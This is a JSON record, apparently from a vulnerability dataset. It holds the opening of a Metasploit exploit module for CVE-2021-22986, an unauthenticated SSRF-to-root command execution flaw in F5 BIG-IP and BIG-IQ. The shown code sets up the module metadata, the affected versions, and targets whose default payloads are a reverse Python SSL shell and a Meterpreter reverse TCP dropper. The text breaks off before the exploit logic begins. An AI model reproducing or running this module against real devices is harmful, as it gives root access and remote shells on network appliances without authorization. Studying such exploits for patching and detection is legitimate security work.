{
    "text": "vul_name : F5 iControl Server-Side Request Forgery / Remote Command Execution ， vul_cve : CVE-2021-22986 ， vul_poc :  ，  # This module requires Metasploit :  ，  # Current source :  ， class MetasploitModule < Msf : Exploit : Remote ， Rank = ExcellentRanking ， prepend Msf : Exploit : Remote : AutoCheck ， include Msf : Exploit : Remote : HttpClient ， include Msf : Exploit : CmdStager ， super (  ， update_info (  ， info ,  ， 'Name' => 'F5 iControl REST Unauthenticated SSRF Token Generation RCE' ,  ， 'Description' => %q{ ， This module exploits a pre-auth SSRF in the F5 iControl REST API's ， /mgmt/shared/authn/login endpoint to generate an X-F5-Auth-Token that ， can be used to execute root commands on an affected BIG-IP or BIG-IQ ， device. This vulnerability is known as CVE-2021-22986. ， CVE-2021-22986 affects the following BIG-IP versions :  ，  * 12.1.0 - 12.1.5 ，  * 13.1.0 - 13.1.3 ，  * 14.1.0 - 14.1.3 ，  * 15.1.0 - 15.1.2 ，  * 16.0.0 - 16.0.1 ， And the following BIG-IQ versions :  ，  * 6.0.0 - 6.1.0 ，  * 7.0.0 ，  * 7.1.0 ， Tested against BIG-IP Virtual Edition 16.0.1 in VMware Fusion. ， } ,  ， 'Author' => [  ， 'wvu' ,  # Analysis and exploit ， 'Rich Warren' # First blood ( RCE ) and endpoint collaboration ，  ]  ,  ， ' ，  [ 'CVE' , '2021-22986' ]  ,  ，  [ 'URL' , ' ，  [ 'URL' , ' ，  [ 'URL' , ' ，  ]  ,  ， 'DisclosureDate' => '2021-03-10' ,  # Vendor advisory ， 'License' => MSF_LICENSE ,  ， 'Platform' => [ 'unix' , 'linux' ]  ,  ， 'Arch' => [ ARCH_CMD , ARCH_X86 , ARCH_X64 ]  ,  ， 'Privileged' => true ,  ， 'Targets' => [  ，  [  ， 'Unix Command' ,  ， { ， 'Platform' => 'unix' ,  ， 'Arch' => ARCH_CMD ,  ， 'Type' => : unix_cmd ,  ， 'DefaultOptions' => { ， 'PAYLOAD' => 'cmd/unix/reverse_python_ssl' ， } ， } ，  ]  ,  ，  [  ， 'Linux Dropper' ,  ， { ， 'Platform' => 'linux' ,  ， 'Arch' => [ ARCH_X86 , ARCH_X64 ]  ,  ， 'Type' => : linux_dropper ,  ， 'DefaultOptions' => { ， 'CMDSTAGER : FLAVOR' => : bourne ,  ， 'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp' ， } ， } ，  ]  ，  ]  ,  ， 'DefaultTarget' => 0 ,  ， 'DefaultOptions' => { ， 'SSL' => true ， } ,  ， 'Notes' => { ， 'Stability' => [ CRASH_SAFE ]  ,  ， 'Reliability' => [ REPEATABLE_SESSION ]  ,  # Only one concurrent session ， 'SideEffects' => [  ， IOC_IN_LOGS ,  # /var/log/restjavad.0.log ( rotated )  ， ACCOUNT_LOCKOUTS ,  # Unlikely with bigipAuthCookie ， ARTIFACTS_ON_DISK # CmdStager ，  ]  ， } ， register_options (  [  ， Opt : RPORT ( 443 )  ,  ， OptString.new ( 'TARGETURI' ,  [ true , 'Base path' , '/' ]  )  ,  ， OptString.new ( 'USERNAME' ,  [ true , 'Valid admin username' , 'admin' ]  )  ,  ， OptString.new ( 'ENDPOINT' ,  [ false , 'Custom token generation endpoint' ]  )  ，  ]  )  ， register_advanced_options (  [  ， OptFloat.new ( 'CmdExecTimeout' ,  [ true , 'Command execution timeout' , 3.5 ]  )  ，  ]  )  ， end ， def username ， datastore [ 'USERNAME' ]  ， end ， def user_reference_endpoint ， normalize_uri ( target_uri.path , '/mgmt/shared/authz/users' , username )  ， end ， def check",
    "time": "2021.04.04"
}